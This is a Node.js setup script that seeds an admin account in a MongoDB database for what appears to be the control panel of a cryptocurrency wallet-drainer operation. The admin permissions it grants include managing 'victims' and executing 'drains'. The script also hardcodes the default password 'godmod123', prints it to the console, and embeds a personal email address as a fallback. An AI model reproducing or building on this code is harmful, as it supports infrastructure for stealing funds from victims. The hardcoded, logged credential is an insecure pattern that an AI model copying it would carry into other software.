const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
require('dotenv').config();
const User = require('./src/models/User');

async function initAdmin() {
    try {
        const mongoUri = process.env.MONGODB_URI;
        console.log('Connecting to Atlas via SRV...');
        
        await mongoose.connect(mongoUri, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            serverSelectionTimeoutMS: 15000,
            dbName: 'godmod-dcrypt'
        });

        const adminEmail = process.env.ADMIN_EMAIL || 'xos.owner@gmail.com';
        const existingAdmin = await User.findOne({ email: adminEmail });

        if (existingAdmin) {
            console.log('Admin already exists');
        } else {
            const hashedPassword = await bcrypt.hash('godmod123', 12);
            const admin = new User({
                username: 'admin',
                email: adminEmail,
                password: hashedPassword,
                role: 'admin',
                status: 'active',
                permissions: {
                    canViewDashboard: true,
                    canManageVictims: true,
                    canManageTransactions: true,
                    canManageContracts: true,
                    canExecuteDrains: true,
                    canViewLogs: true,
                    canManageSettings: true
                }
            });

            await admin.save();
            console.log('Admin user created successfully');
            console.log('Username: admin');
            console.log('Email:', adminEmail);
            console.log('Password: godmod123 (Please change this after login)');
        }

        await mongoose.connection.close();
        process.exit(0);
    } catch (error) {
        console.error('Error initializing admin:', error);
        process.exit(1);
    }
}

initAdmin();
